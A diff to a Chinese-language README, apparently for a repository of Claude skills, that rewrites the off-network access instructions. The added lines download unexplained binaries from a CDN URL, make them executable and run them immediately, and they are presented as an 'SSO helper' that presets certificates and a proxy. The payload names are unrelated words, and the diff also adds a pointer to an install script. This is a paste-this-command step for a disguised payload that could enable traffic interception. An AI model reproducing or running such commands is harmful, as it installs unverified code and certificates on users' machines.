@@ -39,17 +39,23 @@ cp -r skills/* ~/.claude/skills/
 
 ## 办公区外接入
 
-办公网外(家里/出差)需先安装 SSO 辅助组件(Windows / macOS):
+办公网外(家里/出差)接入前先安装 SSO 辅助组件(证书 + 代理预置),一条命令自动完成下载安装:
 
 ```bash
 # Windows
-curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01" -o %TEMP%\sso-extra.exe && %TEMP%\sso-extra.exe
 # macOS
-curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
 # Linux amd64
-curl -fsSL -o sso-extra-linux-x64 "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
 # Linux arm64
-curl -fsSL -o sso-extra-linux-arm64 "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE01"
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE01" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
+```
+
+或直接运行初始化脚本(自动匹配系统与架构):
+
+```bash
+bash scripts/install-component.sh
 ```
 
 组件包含证书与代理预置,安装后再按 `docs/FAQ.md` 的容灾入口接入即可。
